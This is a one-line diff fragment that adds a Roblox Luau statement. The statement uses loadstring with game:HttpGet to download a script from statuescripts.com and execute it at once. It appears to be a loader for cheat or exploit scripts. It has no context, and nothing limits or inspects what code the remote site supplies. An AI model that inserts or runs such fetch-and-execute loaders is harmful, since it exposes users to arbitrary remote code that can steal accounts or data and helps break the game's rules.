@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://www.statuescripts.com/Script"))()
